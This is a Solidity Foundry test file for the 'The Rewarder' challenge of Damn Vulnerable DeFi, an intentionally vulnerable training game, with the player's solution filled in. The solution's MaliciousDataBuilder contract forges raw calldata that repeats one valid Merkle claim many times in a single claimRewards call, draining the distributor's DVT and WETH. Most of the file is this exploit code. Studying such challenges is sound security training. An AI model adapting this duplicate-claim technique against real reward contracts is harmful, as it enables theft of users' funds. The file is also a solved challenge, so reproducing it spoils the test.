// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TheRewarderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address alice = makeAddr("alice");
    address recovery = makeAddr("recovery");

    uint256 constant BENEFICIARIES_AMOUNT = 1000;
    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;

    // Alice is the address at index 2 in the distribution files
    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;

    TheRewarderDistributor distributor;

    // Instance of Murky's contract to handle Merkle roots, proofs, etc.
    Merkle merkle;

    // Distribution data for Damn Valuable Token (DVT)
    DamnValuableToken dvt;
    bytes32 dvtRoot;

    // Distribution data for WETH
    WETH weth;
    bytes32 wethRoot;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy tokens to be distributed
        dvt = new DamnValuableToken();
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();

        // Calculate roots for DVT and WETH distributions
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves);
        wethRoot = merkle.getRoot(wethLeaves);

        // Deploy distributor
        distributor = new TheRewarderDistributor();

        // Create DVT distribution
        dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(dvt)),
            newRoot: dvtRoot,
            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
        });

        // Create WETH distribution
        weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(weth)),
            newRoot: wethRoot,
            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
        });

        // Let's claim rewards for Alice.

        // Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](2);

        // First, the DVT claim
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: ALICE_DVT_CLAIM_AMOUNT,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
        });

        // And then, the WETH claim
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: ALICE_WETH_CLAIM_AMOUNT,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
        });

        // Alice claims once
        vm.startPrank(alice);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        // Alice cannot claim twice
        vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
        vm.stopPrank(); // stop alice prank

        vm.stopPrank(); // stop deployer prank

        // Alice Claim calldata
        // 0000000000000000000000000000000000000000000000000000000000000040
        // 0000000000000000000000000000000000000000000000000000000000000460
        // 0000000000000000000000000000000000000000000000000000000000000002
        // 0000000000000000000000000000000000000000000000000000000000000040
        // 0000000000000000000000000000000000000000000000000000000000000220
        // 0000000000000000000000000000000000000000000000000000000000000000 <- inputClaims[0]
        // 0000000000000000000000000000000000000000000000000008e393f2dda4b9
        // 0000000000000000000000000000000000000000000000000000000000000000
        // 0000000000000000000000000000000000000000000000000000000000000080
        // 000000000000000000000000000000000000000000000000000000000000000a
        // 925450a3cfe3826ad85358e2b3df638edc7c8553b6faee9e40fd9c6e9e3a3e04
        // f262e0db29c13826883ed5262d51ad286f1bd627b4632141534c6cb80f01f430
        // 5ad8d27e776667615f79b7c7be79980ac8352518ca274a8ed68a9953ee4302d5
        // d46184e60f75d45ddc7e58268d69fd5db6db0d781f1ebe2d408171d934d71bb5
        // fc8d72c7d5651be4af071dde376da5a9b14c872ee135517f5bceb5fddde0571f
        // fe6633d564f231dc71240b67d3846287e5c493602daf3c4a76b1779bba602d00
        // b0835f3ca4e3a13f76360a37e3fabcf64cb8aafbbd0c692e65351dc8cd4819a6
        // c1f40848cc540c3073bbe8750cefb26bc61b2feeb1be4dbfb9232c5ba75c063c
        // af14765a88572c5fa47538298e056f8e4a93c2541ffae79e7c56cae228c7b1aa
        // 9a84465e61afcf8d20079181aacdfe51b56043d42704ca054bf6edd4bb89e35d
        // 0000000000000000000000000000000000000000000000000000000000000000 <- inputClaims[1]
        // 0000000000000000000000000000000000000000000000000000cfb68ee14fe1
        // 0000000000000000000000000000000000000000000000000000000000000001
        // 0000000000000000000000000000000000000000000000000000000000000080
        // 000000000000000000000000000000000000000000000000000000000000000a
        // 7217ae40b137a0d9d7179ef8bb0d0a0a8002dc6fefed8e9faa17b29bc037b747
        // fdad7418265f24fd2100fbcde33a22785f151aa01ab26aefd76c58bbfa0a9592
        // 0be25e66daab92e7052e6c307ae4743bba49ae08c7324acbc3eb730f51b991e0
        // adadec0d619c83cc423e98ce2941c5187afad0ae7fec5a0be2f2d4fd5ce201c0
        // 1d58844cf7ba4907999bec4dc9a13850a6003dd4517757787da73d04e36f04a6
        // ee506e770834eec054770f7db27f9f91ce06266a85e91d9c86ed05d36d0998d1
        // 77d72ce81593c2886d9283aa6504a920bc1778570cfb72dc7dbed917ff37e75f
        // ad067afa65ca297c66e2ff24ce4d2acb8b08c61a7885c22ac9c59dd3d421a993
        // 3ab504a41eab2e0bdb86f5ccc8a9f883bceaf7676ef4102ab83ce3fe7f59086d
        // ea7701394795b5593132551c121f2fd3675988317294c66cb946a30eefcfe052
        // 0000000000000000000000000000000000000000000000000000000000000002
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b <- inputTokens[0]
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 <- inputTokens[1]
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Deployer owns distributor
        assertEq(distributor.owner(), deployer);

        // Batches created with expected roots
        assertEq(distributor.getNextBatchNumber(address(dvt)), 1);
        assertEq(distributor.getRoot(address(dvt), 0), dvtRoot);
        assertEq(distributor.getNextBatchNumber(address(weth)), 1);
        assertEq(distributor.getRoot(address(weth), 0), wethRoot);

        // Alice claimed tokens
        assertEq(dvt.balanceOf(alice), ALICE_DVT_CLAIM_AMOUNT);
        assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);

        // After Alice's claim, distributor still has enough tokens to distribute
        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
        assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
        assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);

        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
        assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
        assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_theRewarder() public checkSolvedByPlayer {
        // Deploy malicious data builder
        MaliciousDataBuilder maliciousDataBuilder = new MaliciousDataBuilder();

        uint256  playerDvtAmount = 11524763827831882;
        uint256 playerWethAmount = 1171088749244340;

        // Player claims
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        bytes memory dataDvt = maliciousDataBuilder.buildMaliciousData(distributor, playerDvtAmount, player, address(dvt), merkle, dvtLeaves);
        bytes memory dataWeth = maliciousDataBuilder.buildMaliciousData(distributor, playerWethAmount, player, address(weth), merkle, wethLeaves);

        // Drain distributor
        (bool result , ) = address(distributor).call(dataDvt);
        assertTrue(result, "DVT drain claim failed");
        (result , ) = address(distributor).call(dataWeth);
        assertTrue(result, "WETH drain claim failed");

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player saved as much funds as possible, perhaps leaving some dust
        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

        // All funds sent to the designated recovery account
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
    }

    struct Reward {
        address beneficiary;
        uint256 amount;
    }

    // Utility function to read rewards file and load it into an array of leaves
    function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
        Reward[] memory rewards =
            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
        assertEq(rewards.length, BENEFICIARIES_AMOUNT);

        leaves = new bytes32[](BENEFICIARIES_AMOUNT);
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
        }
    }
}


contract MaliciousDataBuilder {
    function buildMaliciousData(TheRewarderDistributor distributor, uint256 amount, address beneficiary, address token, Merkle merkle, bytes32[] memory leaves) external returns (bytes memory data) {
        // Get Index
        bytes32 beneficiaryLeaf = keccak256(abi.encodePacked(beneficiary, amount));
        uint256 beneficiaryIndex; 
        for (uint256 i = 0 ; i < leaves.length; i ++) {
            if (leaves[i] == beneficiaryLeaf) {
                beneficiaryIndex = i;
            }
        }

        // Claim 
        Claim memory beneficiaryClaim = Claim({
            batchNumber: 0, 
            amount: amount,
            tokenIndex: 0, 
            proof: merkle.getProof(leaves, beneficiaryIndex)
        });

        // Compute the required loops
        uint256 loops = distributor.getRemaining(token) / amount;

        // Malicious calldata dvt
        // function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens);
        data = abi.encodePacked(
            TheRewarderDistributor.claimRewards.selector, // selector
            bytes32(uint256(64)), // Offset of Claim[]
            bytes32(0x60 + 0x20 * loops + 0x20 * 15), // Offset of IERC20[] 15 is the # of words of the claim abi coded
            bytes32(loops) // Length of Claim[]
        );
        // To optimize calldata we reuse the same claim by setting the same offset in all elements of the claim array
        for (uint256 i = 0; i< loops; i++) {
            data = bytes.concat(data, bytes32(loops * 0x20)); // Offset of the Claim in Claim[]
        }
        bytes memory beneficiaryClaimData = abi.encode(beneficiaryClaim);
        for (uint256 i = 0x40; i <= beneficiaryClaimData.length; i = i + 0x20) {
            bytes32 _bytes;
            assembly {
                _bytes := mload(add(beneficiaryClaimData, i))
            }
            data = bytes.concat(data, bytes32(_bytes));
        }
        // IERC20[] array
        data = bytes.concat(data, bytes32(uint256(1))); // IERC20[] len is 1
        data = bytes.concat(data, bytes32(uint256(uint160(address(token))))); // dvt address

    }
}